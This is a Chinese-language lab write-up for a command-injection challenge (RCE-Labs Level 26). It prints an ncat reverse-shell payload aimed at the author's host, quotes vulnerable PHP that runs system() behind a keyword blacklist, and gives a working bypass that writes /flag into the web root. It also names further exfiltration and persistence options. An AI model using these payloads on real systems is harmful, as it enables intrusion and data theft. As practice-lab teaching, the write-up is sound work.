RCE-Labs Level 26 - ncat 反弹 Shell 与 WAF 绕过

2026年10月5日 RCE-Labs 反弹Shell WAF绕过

一、题目信息

  • 1.题目名称：RCE-Labs Level 26 (ncat 反弹 Shell 与 WAF 绕过)
  • 2.题目平台：RCE-Labs 靶场 (灵境平台部署)
  • 3.题目类型：Web安全 / 远程代码执行 (RCE) / 反弹 Shell / WAF 绕过
  • 4.靶场链接：http://靶机IP:8080/less-26/
  • 5.涉及工具：浏览器、Burp Suite、Mac 终端 (nc)

二、解题步骤

1. 分析题目考什么

这一关考察的是 ncat 命令的使用，并且明确提示“注意waf”。这意味着 ncat 或反弹 Shell 的关键字很可能被 WAF 拦截，导致常规的反弹 Shell 路径不通。此时需要寻找替代方案，或将数据外带并写入 Web 目录。

2. 怎么想（破题思路与踩坑记录）

踩坑记录一：Burp 返回 200 但终端无反应

尝试 Payload：?cmd=ncat%20192.168.1.19%2080%20-e%20/bin/sh%20%26

失败响应：Burp 显示 200 OK，但 Mac 终端执行 nc -l -4 80 没有任何连接信息。

原因分析（三重困境）：

  • WAF 静默拦截：WAF 成功识别并拦截了 ncat 关键字，但为了让页面看起来正常，依然返回了 HTTP 200，导致前端无法察觉。
  • 环境缺失：靶机是 Alpine Linux 容器，默认没有预装 ncat（它是 Nmap 工具集的一部分），命令执行直接失败。
  • 网络限制：Docker 网络可能仅允许 HTTP 出站（80端口），而反弹 Shell 需要建立长期的 TCP 连接，可能被出站防火墙阻断。

3. 怎么解（详细步骤与逐字翻译）

源码核心逻辑

$pattern = '/cat|tac|head|tail|more|less|nl|sort|uniq|od|xxd|hexdump|base32|base64|strings|grep|file|find|cp|mv|ping|curl|echo|wget|ncat/';
if(!preg_match($pattern,$cmd)){
    system($cmd);
}

最终成功 Payload：重定向写入 Web 目录

既然反弹 Shell 被拦截，我们利用未被拦截的 sed 和重定向符 > 直接读取 Flag 并写入 Web 目录：

?cmd=sed -n '1,10p' /flag > 7.txt

命令逐字解析：

  • sed -n '1,10p' /flag：读取 flag 文件的前 10 行。
  • >：Shell 重定向符，将标准输出写入 7.txt。
  • 7.txt：目标文件名，位于 Web 根目录下。

第二步：访问文件

访问 http://靶机IP:8080/less-26/7.txt，成功回显明文 flag{TEST_Dynamic_FLAG}。

4. 怎么迁移（跨学科与跨领域联想）

  • 红队实战中的备份方案：在真实护网中，如果反弹 Shell 被 WAF 或防火墙拦截，红队通常会立即采用“文件写入”或“DNS/ICMP 隧道”进行数据外带，因为 HTTP 请求（静态文件读取）通常不会被完全封锁。
  • 业务风控中的绕过：在业务安全领域，攻击者也会通过类似的方式绕过风控规则。比如禁止了某个敏感操作的关键字，攻击者会寻找功能相似的 API 接口进行替代。

三、名词大全与原理深度复盘

1. ncat 与 nc 的区别

nc（Netcat）是经典的 Unix 网络工具，历史悠久，但不同发行版差异较大。ncat 是 Nmap 项目组开发的现代替代品，功能更强大，支持 SSL 加密、代理连接等。靶场提示使用 ncat，但由于它需要额外安装，且容易被 WAF 检测，所以不是最稳妥的通关方式。

2. WAF (Web 应用防火墙) 的拦截逻辑

WAF 部署在 Web 服务器之前，通过分析 HTTP 请求的 URL、参数、Header 来识别恶意流量。对于 RCE 漏洞，WAF 通常会维护一个“黑名单”（如 `cat`、`ncat`、`bash` 等）。如果请求中包含这些关键字，WAF 会直接丢弃请求，并可能返回一个伪装成 200 OK 的假页面，让攻击者难以判断命令是否真正执行。

3. 反弹 Shell 的底层机制

反弹 Shell 需要靶机主动向攻击机发起 TCP 连接，并将标准输入（stdin）、标准输出（stdout）、标准错误（stderr）全部重定向到这个 TCP 连接上。这样，攻击机就能通过 TCP 通道向靶机发送命令，并接收执行结果。但由于需要建立长连接，极易被出站防火墙拦截。

4. 核心名词解释（陌生人也能看懂版）

  • WAF (Web 应用防火墙)：专门用于保护 Web 应用的安全设备，能识别并拦截 SQL 注入、XSS、RCE 等攻击特征。
  • TCP 长连接：一次建立连接后，持续保持通信状态，不立即断开。反弹 Shell 必须依赖长连接。
  • 标准输入/输出/错误：Linux 进程默认的三个数据通道。反弹 Shell 的核心就是把这三个通道通过 TCP 连接暴露给攻击者。

四、题目思考

1. 这跟前面关卡的区别

Level 25 我们尝试了直接反弹 Shell，但受限于 Docker 网络和 BusyBox 阉割。Level 26 则引入了更强的对手——WAF。它不再是简单的命令替换（如把 `cat` 换成 `sed`），而是从网络层面对特定流量进行拦截，迫使攻击者必须掌握“备用数据外带通道”。

2. 这种题目的出现原因（底层逻辑与历史原因）

在真实网络架构中，防火墙策略通常遵循“默认拒绝”原则，仅开放必要的 HTTP/HTTPS 端口。反弹 Shell 使用的非标准端口或特定命令很容易被阻断。这类题目正是模拟这种“受限网络环境”，考察渗透测试人员能否在有限条件下灵活变通。

3. 这种漏洞在实际中的应用

在护网和红队行动中，当常规的 C2（命令与控制）通道被拦截时，红队会转而使用 DNS 隧道、ICMP 隧道或 HTTPS 伪装等方式外带数据。学会“写入 Web 目录”则是基础中的基础，也是最稳定的战果保障。

4. 如何抽象理解概念（大白话）

把读取文件比作“考试传递答案”。Level 25 是你试图在考场里用手机发短信（反弹 Shell），但监考老师没收了手机（Docker 网络限制）。Level 26 是你又试图用对讲机（`ncat`），但被屏蔽器（WAF）干扰了。最后你发现，直接把答案写在纸条上（写入文件）扔到窗外，是最稳妥的作弊方式（通过 HTTP 访问）。

5. 他的本质

本质是当一条攻击路径（反弹 Shell）被拦截时，寻找替代的、可绕过 WAF 和网络限制的数据外带路径（文件写入 / HTTP 读取）。这体现了渗透测试中“条条大路通罗马”的核心思想。

6. 如果我是出题人或者攻击者我会怎么防守或者破解

  • 防守方（蓝队）：WAF 不仅要拦截 ncat，还要拦截 nc、bash -i、sh -i 等反弹 Shell 关键字。同时，要在 Docker 网络层面严格限制非 HTTP 端口的出站流量。对于文件写入，需要严格限制 Web 用户的写入权限。
  • 破解方（红队）：如果 ncat 被拦截，尝试使用 nc、bash、python 等替代。如果写文件也被拦截，考虑使用 tee 命令，或者利用 ICMP 协议（ping -p）携带数据外带。如果所有出网路径都被封死，则只能尝试内网横向移动或写入内存马长期潜伏。
